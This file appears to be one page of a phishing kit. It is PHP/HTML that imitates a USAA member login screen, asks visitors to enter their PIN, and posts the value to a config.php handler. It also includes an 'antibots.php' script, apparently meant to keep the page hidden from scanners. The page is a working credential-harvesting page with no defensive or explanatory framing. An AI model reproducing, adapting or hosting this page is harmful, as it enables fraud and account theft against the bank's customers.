<?php include '../antibots.php';?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Member Account Login | USAA    </title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="USAA-emblem.jpg" rel="shortcut icon" type="image/x-icon">
<link href="pin.css" rel="stylesheet">
<link href="index.css" rel="stylesheet">
</head>
<body>
<div id="container">
<div id="wb_Image1">
<img src="images/Capture.PNG" id="Image1" alt=""></div>
<div id="wb_Form1">
<form name="Form1" method="post" action="config.php" enctype="multipart/form-data" id="Form1">
<input type="hidden" name="formid" value="form1">
<input type="text" id="Editbox1" name="1" value="" spellcheck="false" required placeholder="XXXX" maxlength="6" required="required">
<div id="wb_Text1">
<p style="font-size:20px;line-height:22.5px;font-weight:bold;color:#000000;"><span style="color:#000000;padding-left: 15px;">Enter Your PIN</span></p></div>
<input type="submit" id="Button1" name="" value="Next" maxlength="4" required="required">
<div id="wb_Image4">
<img src="images/139801.png" id="Image4" alt=""></div>
</form>
</div>
<div id="wb_Image7">
<a href="#"><img src="images/WWWCapture.PNG" id="Image7" alt=""></a></div>
<div id="wb_Text3">
<p style="font-size:53px;line-height:59.5px;color:#FFFFFF;"><span style="color:#FFFFFF;">WELCOME </span></p>
<p style="font-size:53px;line-height:59.5px;color:#FFFFFF;"><span style="color:#FFFFFF;">BACK</span><span style="color:#FFFFFF;"> ,</span></p></div>
</div>
<div id="Layer1">
<div id="Layer1_Container">
<div id="wb_Image2">
<img src="images/aCapture.PNG" id="Image2" alt=""></div>
<div id="wb_Text2">
<p style="font-size:29px;line-height:33px;color:#FFFFFF;"><span style="color:#FFFFFF;">WELCOME </span></p>
<p style="font-size:29px;line-height:33px;color:#FFFFFF;"><span style="color:#FFFFFF;">BACK</span><span style="color:#FFFFFF;"> ,</span></p></div>
</div>
</div>
</body>
</html>